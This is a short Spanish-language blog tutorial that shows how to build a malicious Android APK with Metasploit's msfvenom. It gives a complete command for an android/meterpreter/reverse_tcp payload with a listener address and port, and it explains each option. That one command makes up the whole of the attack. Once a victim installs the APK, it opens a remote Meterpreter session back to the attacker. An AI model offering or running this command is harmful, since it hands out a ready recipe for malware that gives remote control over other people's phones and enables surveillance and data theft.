Como crear un reverse shell para android con msfvenom

En este post veremos como generar un exploit prefabricado con la herramienta de metasploit. Quiero avizar
que no es recomendable utilizar estos tipos de exploit todo el tiempo, siempre es mejor crear los nuestros.
Para comenzar abrimos un terminal y escribimos el siguiente comando
en la shell bash:

$SHELL COMMAND
  1. msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=7777 R>exploit.apk

La opcion -p se usa para especificar el nombre del exploit.
LHOST Es para especificar la direccion a la cual se retornara la sesion meterpreter.
LPORT Es el puerto por donde se mandara la conexion.
R> Es para colocar la ruta y el nombre donde se guardara nuestro apk.

Despues de esto se generara el exploit pertinente. Y de este modo ya tendriamos nuestro exploit generado.
